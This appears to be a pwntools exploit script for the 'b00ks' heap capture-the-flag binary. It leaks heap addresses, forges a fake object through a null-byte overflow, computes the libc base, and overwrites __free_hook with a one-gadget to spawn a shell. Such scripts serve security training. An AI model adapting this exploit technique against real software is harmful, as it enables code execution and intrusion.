from pwn import *

context.log_level = 'debug'
p = process("./b00ks")
libc = ELF("./libc.so.6")
gdb.attach(p)

def memleak1(p):
     p.sendline("4")
     log.info(p.recvuntil("Author:"))
     msg = p.recvline()
     log.info(p.recvuntil(">"))
     msg = msg.split("A"*32)[1].strip("\n")
     addr = u64(msg.ljust(8, "\x00"))
     log.success("Leaked address of struct object : " + hex(addr))
     return addr

def memleak2(p):
     p.sendline("4")
     p.recvuntil("Name: ")
     msg=p.recvline().strip("\n")
     msg=u64(msg.ljust(8, "\x00"))
     log.info(p.recv(timeout = 1))
     log.success("Leaked address of allocated area " + hex(msg))
     return msg

def change_ptr(p):
     log.progress("Changing the struct pointer")
     p.sendline("5")
     log.info(p.recvuntil(":"))
     p.sendline("A"*32)
     log.info(p.recvuntil(">"))

def fake_obj(p, payload, index):
     log.progress("Editing description")
     p.sendline("3")
     log.info(p.recvuntil(":"))
     p.sendline(str(index))
     log.info(p.recvuntil(":"))
     p.sendline(payload)

def create_book(p,size):
     p.sendline("1")
     log.info(p.recvuntil(":"))
     p.sendline(str(size))
     log.info(p.recvuntil(":"))
     p.sendline("asdf")
     log.info(p.recvuntil(":"))
     p.sendline(str(size))
     log.info(p.recvuntil(":"))
     p.sendline("asdf")
     log.info(p.recvuntil(">"))

def release():
     p.sendline("2")
     log.info(p.recvuntil(":"))
     p.sendline("2")

log.info(p.recvuntil(":"))
p.sendline("A"*32)
log.info(p.recvuntil(">"))
create_book(p, 140)
addr = memleak1(p) + 0x38             #address of second object on heap
create_book(p, 0x21000)               #allocate new area
payload = "A"*0x40 + p64(0x1) + p64(addr) * 2 + p64(0xffff) #fake obj
fake_obj(p, payload, 1)
change_ptr(p)                         #null overflow
addr = memleak2(p)
log.info(hex(addr))

#part two
libcbase = addr - 0x5a9010	
malloc_hook = libc.symbols['__free_hook'] + libcbase
execve_addr = libcbase + 0x4526a

#part three
payload = p64(malloc_hook) * 2
fake_obj(p, payload, 1)
payload = p64(execve_addr)
fake_obj(p, payload, 2)
release()

p.interactive()
